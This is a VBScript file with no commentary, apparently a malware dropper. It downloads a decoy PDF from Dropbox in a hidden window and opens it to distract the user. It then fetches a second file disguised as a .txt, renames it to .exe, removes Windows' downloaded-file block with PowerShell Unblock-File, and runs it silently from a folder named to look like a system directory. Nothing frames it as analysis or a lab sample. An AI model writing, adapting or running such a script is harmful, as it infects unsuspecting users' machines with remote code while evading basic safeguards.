Option Explicit

Dim shell, fso
Dim url1, url2
Dim dirPath, pdfPath, txtPath, exePath
Dim cmd

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Paths
dirPath = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\SystemFolder32"
pdfPath = dirPath & "\grJEa QSVM.pdf"
txtPath = dirPath & "\grJEa QSVM.txt"
exePath = dirPath & "\grJEa QSVM.exe"

' Create directory if it doesn't exist
If Not fso.FolderExists(dirPath) Then
    fso.CreateFolder dirPath
End If

' -------- Download First File (PDF) --------
url1 = "https://www.dropbox.com/scl/fi/sls8l92sk3otlndu3pcwq/document.pdf?rlkey=gs0jdu4mlwqh0uaigyno5vi58&st=7br1p2md&dl=1"

cmd = "cmd /c curl -L -o """ & pdfPath & """ """ & url1 & """"
shell.Run cmd, 0, True   ' 0 = hidden window, True = wait until finished

' Open PDF if it exists
If fso.FileExists(pdfPath) Then
    shell.Run """" & pdfPath & """", 0, False
End If

' -------- Download Second File --------
url2 = "https://www.dropbox.com/scl/fi/k2wz5hn06bvxej741i6x0/systemd.txt?rlkey=rjklx1mzreh57xe5v5j4mx9m7&st=vjmirpjs&dl=1"

cmd = "cmd /c curl -L -o """ & txtPath & """ """ & url2 & """"
shell.Run cmd, 0, True

' Rename .txt to .exe
If fso.FileExists(txtPath) Then
    On Error Resume Next
    fso.MoveFile txtPath, exePath
    On Error GoTo 0
End If

' Unblock file and run the EXE
If fso.FileExists(exePath) Then
    ' Use PowerShell to unblock the file
    Dim psCmd
    psCmd = "powershell -NoProfile -Command ""Unblock-File -Path '" & exePath & "'"" "
    shell.Run psCmd, 0, True

    ' Run the EXE after unblocking
    shell.Run """" & exePath & """", 0, False
End If

Set fso = Nothing
Set shell = Nothing